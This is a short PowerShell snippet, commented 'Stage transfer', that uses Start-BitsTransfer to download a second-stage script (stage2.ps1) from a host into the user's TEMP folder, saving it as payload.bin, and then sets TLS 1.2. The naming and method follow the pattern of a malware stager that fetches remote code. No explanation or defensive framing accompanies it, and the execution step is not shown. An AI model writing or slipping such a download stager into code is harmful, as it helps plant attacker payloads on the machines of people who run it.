
<# Stage transfer #> $FetchUrl = "https://internal.corp/stage2.ps1"; $OutputPath = "$env:TEMP\payload.bin"; Start-BitsTransfer -Source $FetchUrl -Destination $OutputPath; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
